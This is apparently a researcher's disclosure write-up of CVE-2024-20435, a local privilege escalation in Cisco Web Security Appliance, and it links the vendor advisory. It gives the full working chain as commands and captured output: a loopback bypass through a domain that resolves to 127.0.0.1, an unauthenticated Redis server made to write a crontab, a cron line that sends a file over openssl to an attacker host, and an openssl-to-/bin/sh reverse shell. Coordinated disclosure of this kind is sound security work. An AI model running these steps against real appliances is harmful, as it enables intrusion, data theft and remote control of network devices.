---
title: Cisco WSA Rce (CVE-2024-20435)
description: Arbitrary Command Execution in Cisco Web Appliance
tags:
- hacking
- exploit
- rce
---

In this writeup I'd like to share one of the few bugs I'm allowed to
talk about, a local privilege escalation in Cisco Web Security
Appliance. While not a spectacular code execution, I found it intriguing
because it mixed different technologies (telnet, Redis and FreeBSD!).

TL;DR A local, low-privileged user on a Cisco WSA can execute arbitrary code through an
unprotected Redis interface and some Telnet shenaningans.

Cisco published the advisory [here](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-swa-priv-esc-7uHpZsCC).

## Pre-requisites

 * A local user on the appliance - note that even if the user is meant
   to have only web access, it will by default have a limited SSH shell
   too
 * The ability to resolve arbitrary domain names
 * A host to connect back to (listening on IP address `<ATTACKER_IP>`)

## Intro

As a first step, we log on the appliance and execute a telnet session.
Before connecting, launch a netcat listener on `<ATTACKER_IP>` on port
12345.

```bash
$ ssh lowpriv@cisco-wsa
(lowpriv@cisco-wsa) Password:
AsyncOS 15.1.0 for Web build 287

Welcome to the Cisco S695 Secure Web Appliance
~
NOTE: This session will expire if left idle for 30 minutes. Any uncommitted configuration
changes will be lost.

[...]

cisco-wsa> telnet

Please select which interface you want to telnet from.
1. Auto
[1]> 1

Enter the remote hostname or IP address.
[]> <ATTACKER_IP>

Enter the remote port.
[23]> 12345

Trying <ATTACKER_IP>...
Connected to <ATTACKER_IP>.
Escape character is '^]'.
```


Once connected, the UNIX telnet client interprets the escape sequence
"`^]`" (`Ctrl-]`) to run a command mode, allowing the user to
reconfigure the current session without interrupting the connection. You
can see the command mode prompt `telnet> ` below. One
of the options allows displaying the shell environment by typing
"environ list", as shown in the following listing:

```bash
^]
telnet> environ list
  SERIAL_NUMBER        [...]
  BASE_HOME            /data/home
  PYTHON_EGG_CACHE     /data/python-eggs
  TRANSLATION_QUEUE    /data/etc/translations
  MALLOC_OPTIONS       X
  PRODUCT_NAME         Cisco S695 Secure Web Appliance
  TMPDIR               /data/tmp
  SHELL                /data/bin/cli.sh
  PYCBOX_DB            /data/lib/pycbox/ironport.db
[...]
  HOME                 /data/home/lowpriv
* USER                 lowpriv
  MODEL_NAME           S695
  RELEASE_TAG          coeus-15-1-0-287
  PATH                 /sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin:/data/home/lowpriv/bin:/usr/local/bin:/data/bin
```

The highlighted text shows useful information such as the search PATH, home directory, etc.

The appliance was found to be running a Redis server, shown here as the output of the shell command "process_status":

```bash
[...]
root          30511    0.0  0.0   18376    6792  -  S    15:26         0:00.00 ipmitool
root          30524    0.0  0.0   12296    3856  -  S    23Jan24       3:11.91 redis-server
root          31342    0.0  0.1 4488448   88844  -  I    16:30         0:07.15 amp
```

The "process_status" command must be executed by a user with higher privileges; however, this information might be also available online to an attacker, and the need for a high-privileged user was not deemed essential for the success of the attack.

Redis server normally listen on port 6379; however, the telnet client was set up to prevent connecting to local IP addresses, as shown below:
```bash
cisco-wsa> whoami

Username: lowpriv
Full Name: [...]
Groups: guest

cisco-wsa> telnet 127.0.0.1 6379

Invalid arguments when processing telnet:
The address must be a hostname or an IPv4/IPv6 address.
The IP address must be a valid IPv4 or a IPv6
address. IPV4 must be 4 numbers separated by a period.  Each number must be a
value from 0 to 255. (Ex: 192.168.1.1). A Valid IPv6 address is represented by
8 groups of 16-bit hexadecimal values separated by colons (:). (Ex:
2001:420:80:1::5)
The IP address cannot be empty and cannot be a loopback, link-local, broadcast or multicast address.
A hostname is a string that must match the following rules:

- A label is a set of characters, numbers, dashes, and underscores.
- The first and last character of a label must be a letter or a number.
- The hostname must have at least 2 labels separated by a period.
- The last label cannot be all numbers.
: '127.0.0.1'
```

To bypass the restriction, I used a domain that points to "127.0.0.1",
for example `localtest.me` (see
[here](https://superuser.com/q/1280827)).

```bash
cisco-wsa> nslookup localtest.me

A=127.0.0.1 TTL=30m
cisco-wsa> telnet localtest.me 6379

Trying 127.0.0.1...
Connected to localtest.me.
Escape character is '^]'.
info
$3291
# Server
redis_version:5.0.5
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:c5557b57b79e4dec
redis_mode:standalone
os:FreeBSD 13.0-RELEASE-p13 amd64
```

As the listing demonstrates, it was possible to connect to the local
Redis server by resolving a domain pointing to 127.0.0.1. The "info"
command was issued, which returned the server version and Operating
System.  

## Arbitrary Command Execution

To reach code execution, I exploited the fact that Redis
by default does not enforce authentication, and allows writing
configuration files to arbitrary location on disk. I'm sorry I can't
find the original author of this exploit to give credit, and the slides
from zeronights are lost in the interwebz.

It should be noted that FreeBSD stores crontabs in a different location
than Linux. Here we need to write to `/var/cron/tabs`, with a filename
matching the local user. In Linux it would normally be
`/var/spool/cron/crontabs`. For some reason, it wasn't possible to run
this as root.

The following commands were issued to the Redis server:

```bash
config set dir "/var/cron/tabs"
+OK
config set dbfilename lowpriv
+OK
set backup1 "\n\n\n*/2 * * * * ping -c 2 <ATTACKER_IP>\n\n"
+OK
save
+OK
```

The first and second command instruct the server to write the configuration in the "/var/cron/tabs/lowpriv" file, which is where FreeBSD systems store "cron" jobs. The third command writes a series of newlines and instructs the cron daemon to send 2 ICMP "ping" packets to a specific host every 2 minutes.
Running a packet capture on the <ATTACKER_IP> host demonstrated code execution:

```
17:47:59.800270 IP <CISCO_WSA_IP> > <ATTACKER_IP>: ICMP echo request, id 17474, seq 0, length 64
17:47:59.800341 IP <ATTACKER_IP> > <CISCO_WSA_IP>: ICMP echo reply, id 17474, seq 0, length 64
17:48:00.867319 IP <CISCO_WSA_IP> > <ATTACKER_IP>: ICMP echo request, id 17474, seq 1, length 64
17:48:00.867373 IP <ATTACKER_IP> > <CISCO_WSA_IP>: ICMP echo reply, id 17474, seq 1, length 64
```

As the evidence shows, two ICMP "ping" packets were sent from the Cisco WSA to the host, demonstrating code execution.

## Data Exfiltration
Through the same mechanism it was possible to demonstrate data exfiltration. A listener was set up on a remote system:
```bash
$ sudo openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```
Obviously you need to create a SSL certificate and private key beforehand. Or you can use `ncat`.

Then using the Redis configuration method, the appliance was instructed to deliver arbitrary files as shown below, in this case the file `/data/bin/cli.sh`:

```bash
set backup3 "\n\n\n*/1 * * * * openssl s_client -quiet -connect <ATTACKER_IP>:443 < /data/bin/cli.sh\n\n"
```

After a short while, the file was then received:
```bash
$ head cli.sh
#!/bin/sh -
# $Header: //prod/coeus-15-1-0-br/wsa/freebsd/bootstrap/generic_wrapper.sh#1 $

# PROVIDE: dtd
# BEFORE: heimdall
# REQUIRE: local

[ -f /etc/phoebe.conf ]    && . /etc/phoebe.conf
[ -f /etc/asyncos.conf ]    && . /etc/asyncos.conf
[ "x$IPDATA" = "x" ]        && export IPDATA=/data
```

## Semi-interactive Shell

Through the same mechanism it was possible to execute arbitrary commands on the
appliance. I think I tried all combinations of netcat, bash pipe
redirections and magic, but none worked as the binaries were not
accessible or redis was jailed ("chrooted"). Using `openssl` seemed to
do the trick:

```
set backup3 "\n\n\n*/1 * * * * openssl s_client -quiet -connect <ATTACKER_IP>:443 | /bin/sh\n\n"
```
The "` | /bin/sh`" part would send every command received through the OpenSSL client to a shell interpreter. A listener was set up and once it received a connection, a "ping" command was executed:
```bash
$ sudo ncat -lnvp 443 --ssl-cert cert.pem --ssl-key key.pem
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from <CISCO_WSA_IP>:12313.
ping -c 1 <ATTACKER_IP>
```

Due to the nature of the "blind" shell, the output wasn’t visible, but a ICMP ping packet was received:
```
12:45:13.471829 IP <CISCO_WSA_IP> > <ATTACKER_IP>: ICMP echo request, id 11852, seq 0, length 64
12:45:13.471892 IP <ATTACKER_IP> > <CISCO_WSA_IP>: ICMP echo reply, id 11852, seq 0, length 64
```
The ICMP packet confirmed arbitrary command execution.

